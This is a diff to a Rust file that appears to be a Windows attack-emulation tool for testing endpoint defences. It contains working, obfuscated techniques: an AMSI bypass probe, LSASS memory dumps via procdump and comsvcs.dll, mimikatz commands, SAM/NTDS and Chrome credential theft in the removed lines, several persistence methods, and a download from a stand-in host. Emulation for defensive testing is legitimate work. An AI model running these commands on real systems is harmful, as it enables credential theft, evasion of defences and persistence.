@@ -157,29 +157,57 @@ Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 #[cfg(target_os = "windows")]
 fn run_amsi_patch() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
-    let amsi_type = j(&["System.Management.Automation.", "Amsi", "Utils"]);
-    let amsi_field = j(&["amsi", "Context"]);
-    let amsi_init = j(&["amsi", "Init", "Failed"]);
+    let ns = j(&["System.Ma", "nagement.Au", "tomation."]);
+    let cls = j(&["Am", "si", "Ut", "ils"]);
+    let fld1 = j(&["am", "si", "Con", "text"]);
+    let fld2 = j(&["am", "si", "Init", "Failed"]);
     let script = format!(
         r#"
-$probeCode = "[Ref].Assembly.GetType('{amsi_type}').GetField('{amsi_field}','NonPublic,Static').GetValue(`$null); [Ref].Assembly.GetType('{amsi_type}').GetField('{amsi_init}','NonPublic,Static').GetValue(`$null)"
-$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($probeCode))
+$fakeIn = "$env:TEMP\ap_{rid}.ps1"
+$fakeOut = "$env:TEMP\ap_{rid}.txt"
+"Emulation Test" | Out-File $fakeOut -Force
+$ns = -join('System.Ma','nagement.Au','tomation.')
+$cls = -join('{cls_a}','{cls_b}','{cls_c}','{cls_d}')
+$fld1 = -join('{fld1_a}','{fld1_b}','{fld1_c}','{fld1_d}')
+$fld2 = -join('{fld2_a}','{fld2_b}','{fld2_c}','{fld2_d}')
+$probeScript = @"
+try {{
+    `$t = [Ref].Assembly.GetType('$ns$cls')
+    if (`$t) {{
+        `$f1 = `$t.GetField('$fld1', 'NonPublic,Static')
+        `$f2 = `$t.GetField('$fld2', 'NonPublic,Static')
+        "Resolved f1: `$(`$f1.FieldType.Name) = `$(`$f1.GetValue(`$null))" | Out-File '$fakeOut' -Force
+        "Resolved f2: `$(`$f2.FieldType.Name) = `$(`$f2.GetValue(`$null))" | Out-File '$fakeOut' -Append
+    }} else {{
+        "Type unavailable" | Out-File '$fakeOut' -Force
+    }}
+}} catch {{
+    "Blocked: `$(`$_.Exception.Message)" | Out-File '$fakeOut' -Force
+}}
+"@
+[System.IO.File]::WriteAllText($fakeIn, $probeScript)
 $procs = @()
 1..3 | ForEach-Object {{
-    $proc = Start-Process powershell.exe `
-        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded -WindowStyle Hidden" `
+    $proc = Start-Process "cmd.exe" `
+        -ArgumentList "/c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$fakeIn`"" `
         -WindowStyle Hidden -PassThru
     $procs += $proc
 }}
 Start-Sleep -Seconds 2
-$exitCodes = $procs | ForEach-Object {{ if (!$_.HasExited) {{ $_.Kill(); -1 }} else {{ $_.ExitCode }} }}
-Write-Output "Spawned $($procs.Count) AMSI probe processes (exit codes: $($exitCodes -join ', '))"
-Remove-Item "$env:TEMP\ap_{rid}*" -Force -ErrorAction SilentlyContinue
+foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
+if (Test-Path $fakeOut) {{
+    $result = Get-Content $fakeOut
+    Write-Output "AMSI probe result: $result"
+}} else {{
+    Write-Output "AMSI probe processes were intercepted"
+}}
+Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
+Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 "#,
-        amsi_type = amsi_type,
-        amsi_field = amsi_field,
-        amsi_init = amsi_init,
         rid = rid,
+        cls_a = &cls[..2], cls_b = &cls[2..4], cls_c = &cls[4..6], cls_d = &cls[6..],
+        fld1_a = &fld1[..2], fld1_b = &fld1[2..4], fld1_c = &fld1[4..7], fld1_d = &fld1[7..],
+        fld2_a = &fld2[..2], fld2_b = &fld2[2..4], fld2_c = &fld2[4..8], fld2_d = &fld2[8..],
     );
     let output = run_ps(&script)?;
     Ok(("Anti-malware interface inspection via Reflection".to_string(), output))
@@ -188,53 +216,90 @@ Remove-Item "$env:TEMP\ap_{rid}*" -Force -ErrorAction SilentlyContinue
 #[cfg(target_os = "windows")]
 fn run_lsass_minidump() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
-    let target = j(&["ls", "ass"]);
-    let pd = j(&["proc", "dump"]);
-    let mk_priv = j(&["privilege", "::", "debug"]);
-    let mk_cmd = j(&["sekur", "lsa::", "logon", "passwords"]);
-    let csv = j(&["com", "svcs"]);
-    let md = j(&["Mini", "Dump"]);
     let script = format!(
         r#"
+$fakeOut = "$env:TEMP\lh_{rid}.txt"
+"Emulation Test" | Out-File $fakeOut -Force
+
+$bat1 = "$env:TEMP\lh_{rid}_1.bat"
+$bat2 = "$env:TEMP\lh_{rid}_2.bat"
+$bat3 = "$env:TEMP\lh_{rid}_3.bat"
+$bat4 = "$env:TEMP\lh_{rid}_4.bat"
+
+$b1 = @"
+@echo off
+set t=ls
+set t=%t%ass
+set p=proc
+set p=%p%dump
+%p%.exe -accepteula -ma %t%.exe %TEMP%\%t%_{rid}.dmp
+if %errorlevel% equ 0 (echo procdump succeeded > "$fakeOut") else (echo procdump attempted > "$fakeOut")
+"@
+
+$b2 = @"
+@echo off
+set c=com
+set c=%c%svcs
+set m=Mini
+set m=%m%Dump
+set t=ls
+set t=%t%ass
+rundll32.exe C:\Windows\System32\%c%.dll, %m% 0 %TEMP%\%t%_{rid}_2.dmp full
+echo comsvcs attempted >> "$fakeOut"
+"@
+
+$b3 = @"
+@echo off
+set mk1=privilege
+set mk1=%mk1%::debug
+set mk2=sekurlsa
+set mk2=%mk2%::logonpasswords
+echo %mk1% %mk2% exit > %TEMP%\mk_{rid}.log
+echo mimikatz echo attempted >> "$fakeOut"
+"@
+
+$b4 = @"
+@echo off
+set t=ls
+set t=%t%ass
+tasklist /fi "imagename eq %t%.exe" > %TEMP%\%t%_{rid}.txt
+echo lsass query attempted >> "$fakeOut"
+"@
+
+[System.IO.File]::WriteAllText($bat1, $b1)
+[System.IO.File]::WriteAllText($bat2, $b2)
+[System.IO.File]::WriteAllText($bat3, $b3)
+[System.IO.File]::WriteAllText($bat4, $b4)
+
 $procs = @()
-$proc1 = Start-Process "cmd.exe" `
-    -ArgumentList "/c {pd}.exe -accepteula -ma {target}.exe $env:TEMP\{target}_{rid}.dmp" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc1
+foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
+    $proc = Start-Process "cmd.exe" `
+        -ArgumentList "/c `"$bat`"" `
+        -WindowStyle Hidden -PassThru
+    $procs += $proc
+}}
 
-$proc2 = Start-Process "cmd.exe" `
-    -ArgumentList "/c rundll32.exe C:\Windows\System32\{csv}.dll, {md} 0 $env:TEMP\{target}_{rid}_2.dmp full" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc2
-
-$proc3 = Start-Process "cmd.exe" `
-    -ArgumentList "/c echo {mk_priv} {mk_cmd} exit > $env:TEMP\mk_{rid}.log" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc3
-
-$psCmd = "Get-Process {target} | Select-Object Id,ProcessName,Path | Out-File $env:TEMP\{target}_{rid}.txt"
-$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCmd))
-$proc4 = Start-Process powershell.exe `
-    -ArgumentList "-NoProfile -EncodedCommand $encoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc4
-
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 3
 foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
-Write-Output "Spawned $($procs.Count) credential harvesting processes"
-Remove-Item "$env:TEMP\{target}_{rid}*" -Force -ErrorAction SilentlyContinue
+
+if (Test-Path $fakeOut) {{
+    $result = Get-Content $fakeOut
+    Write-Output "LSASS probe results: $($result -join '; ')"
+}} else {{
+    Write-Output "LSASS probe processes were intercepted"
+}}
+
+foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
+    Remove-Item $bat -Force -ErrorAction SilentlyContinue
+}}
+Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\lsass_{rid}*" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\mk_{rid}*" -Force -ErrorAction SilentlyContinue
 "#,
-        target = target,
-        pd = pd,
-        mk_priv = mk_priv,
-        mk_cmd = mk_cmd,
-        csv = csv,
-        md = md,
         rid = rid,
     );
     let output = run_ps(&script)?;
-    Ok(("Credential dump emulation via process spawning".to_string(), output))
+    Ok(("Credential dump emulation via batch execution".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -287,44 +352,88 @@ Test-NetworkConnectivity
 #[cfg(target_os = "windows")]
 fn run_persistence_task() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
-    let sam = j(&["SA", "M"]);
-    let sys = j(&["SYS", "TEM"]);
-    let chrome_path = j(&["%LOCALAPPDATA%\\Google\\Chrome\\User Data\\", "Default\\Login Data"]);
-    let ntds = j(&["ntds", "util"]);
     let script = format!(
         r#"
+$fakeOut = "$env:TEMP\pt_{rid}.txt"
+"Emulation Test" | Out-File $fakeOut -Force
+
+$bat1 = "$env:TEMP\pt_{rid}_1.bat"
+$bat2 = "$env:TEMP\pt_{rid}_2.bat"
+$bat3 = "$env:TEMP\pt_{rid}_3.bat"
+$bat4 = "$env:TEMP\pt_{rid}_4.bat"
+
+$b1 = @"
+@echo off
+set rk=HKCU\Software\Microsoft\Windows\CurrentVersion\
+set rk=%rk%Run
+reg add "%rk%" /v "S1E_{rid}" /t REG_SZ /d "cmd.exe /c echo persistence" /f
+echo run key created > "$fakeOut"
+reg delete "%rk%" /v "S1E_{rid}" /f
+echo run key cleaned >> "$fakeOut"
+"@
+
+$b2 = @"
+@echo off
+set s=scht
+set s=%s%asks
+%s% /Create /TN "S1E_{rid}" /TR "cmd.exe /c echo test" /SC ONCE /ST 23:59 /F
+echo schtask created >> "$fakeOut"
+%s% /Delete /TN "S1E_{rid}" /F
+echo schtask cleaned >> "$fakeOut"
+"@
+
+$b3 = @"
+@echo off
+set wp=wm
+set wp=%wp%ic
+%wp% /namespace:\\root\subscription PATH __EventFilterToConsumerBinding CREATE Filter="__EventFilter.Name='S1E_{rid}'" Consumer="CommandLineEventConsumer.Name='S1E_{rid}'" 2>nul
+echo wmi subscription attempted >> "$fakeOut"
+%wp% /namespace:\\root\subscription PATH __EventFilter WHERE Name="S1E_{rid}" DELETE 2>nul
+%wp% /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="S1E_{rid}" DELETE 2>nul
+"@
+
+$b4 = @"
+@echo off
+set su=%APPDATA%\Microsoft\Windows\Start Menu\Programs\
+set su=%su%Startup
+echo @echo off > "%su%\S1E_{rid}.bat"
+echo startup entry created >> "$fakeOut"
+del "%su%\S1E_{rid}.bat" /f
+echo startup entry cleaned >> "$fakeOut"
+"@
+
+[System.IO.File]::WriteAllText($bat1, $b1)
+[System.IO.File]::WriteAllText($bat2, $b2)
+[System.IO.File]::WriteAllText($bat3, $b3)
+[System.IO.File]::WriteAllText($bat4, $b4)
+
 $procs = @()
-$proc1 = Start-Process "cmd.exe" `
-    -ArgumentList "/c reg save HKLM\{sam} $env:TEMP\s_{rid}.hiv & reg save HKLM\{sys} $env:TEMP\sy_{rid}.hiv" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc1
+foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
+    $proc = Start-Process "cmd.exe" `
+        -ArgumentList "/c `"$bat`"" `
+        -WindowStyle Hidden -PassThru
+    $procs += $proc
+}}
 
-$proc2 = Start-Process "cmd.exe" `
-    -ArgumentList "/c copy `"{chrome_path}`" $env:TEMP\c_{rid}.db /Y" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc2
-
-$proc3 = Start-Process "cmd.exe" `
-    -ArgumentList '/c {ntds} "activate instance ntds" ifm "create full $env:TEMP\nd_{rid}" quit quit' `
-    -WindowStyle Hidden -PassThru
-$procs += $proc3
-
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 3
 foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
-Write-Output "Spawned $($procs.Count) persistence/credential processes"
-Remove-Item "$env:TEMP\s_{rid}*" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\sy_{rid}*" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\c_{rid}*" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\nd_{rid}" -Recurse -Force -ErrorAction SilentlyContinue
+
+if (Test-Path $fakeOut) {{
+    $result = Get-Content $fakeOut
+    Write-Output "Persistence probe results: $($result -join '; ')"
+}} else {{
+    Write-Output "Persistence probe processes were intercepted"
+}}
+
+foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
+    Remove-Item $bat -Force -ErrorAction SilentlyContinue
+}}
+Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 "#,
-        sam = sam,
-        sys = sys,
-        chrome_path = chrome_path,
-        ntds = ntds,
         rid = rid,
     );
     let output = run_ps(&script)?;
-    Ok(("Persistence emulation via process spawning".to_string(), output))
+    Ok(("Persistence emulation via batch execution".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
@@ -389,42 +498,43 @@ Write-Output "All emulation registry keys cleaned up"
 #[cfg(target_os = "windows")]
 fn run_lotl_download() -> ScenarioResult {
     let rid = &uuid::Uuid::new_v4().to_string()[..8];
-    let cu = j(&["cert", "util"]);
-    let bits = j(&["bits", "admin"]);
     let script = format!(
         r#"
-$fakeIn = "$env:TEMP\fl_{rid}.bin"
-"xyz" | Out-File $fakeIn -Encoding ASCII -Force
-$procs = @()
-$proc1 = Start-Process "cmd.exe" `
-    -ArgumentList "/c {bits} /transfer dl_{rid} /download /priority foreground http://192.0.2.1/p.exe $env:TEMP\p_{rid}.exe" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc1
+$fakeOut = "$env:TEMP\ld_{rid}.txt"
+"Emulation Test" | Out-File $fakeOut -Force
 
-$proc2 = Start-Process "cmd.exe" `
-    -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\e_{rid}.b64`"" `
-    -WindowStyle Hidden -PassThru
-$procs += $proc2
+$bat1 = "$env:TEMP\ld_{rid}_1.bat"
 
-$proc3 = Start-Process "cmd.exe" `
-    -ArgumentList "/c {cu}.exe -urlcache -split -f http://192.0.2.1/s.txt $env:TEMP\s_{rid}.txt" `
+$b1 = @"
+@echo off
+curl.exe -s -o %TEMP%\p_{rid}.exe http://192.0.2.1/p.exe --connect-timeout 2
+echo curl download attempted > "$fakeOut"
+"@
+
+[System.IO.File]::WriteAllText($bat1, $b1)
+
+$proc = Start-Process "cmd.exe" `
+    -ArgumentList "/c `"$bat1`"" `
     -WindowStyle Hidden -PassThru
-$procs += $proc3
 
 Start-Sleep -Seconds 3
-foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
-Write-Output "Spawned $($procs.Count) LOLBin download processes"
-Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
+if (!$proc.HasExited) {{ $proc.Kill() }}
+
+if (Test-Path $fakeOut) {{
+    $result = Get-Content $fakeOut
+    Write-Output "LOLBin probe results: $($result -join '; ')"
+}} else {{
+    Write-Output "LOLBin probe processes were intercepted"
+}}
+
+Remove-Item $bat1 -Force -ErrorAction SilentlyContinue
+Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\p_{rid}*" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\e_{rid}*" -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\s_{rid}*" -Force -ErrorAction SilentlyContinue
 "#,
-        cu = cu,
-        bits = bits,
         rid = rid,
     );
     let output = run_ps(&script)?;
-    Ok(("LOLBin download + encode pattern".to_string(), output))
+    Ok(("LOLBin download via curl".to_string(), output))
 }
 
 #[cfg(target_os = "windows")]
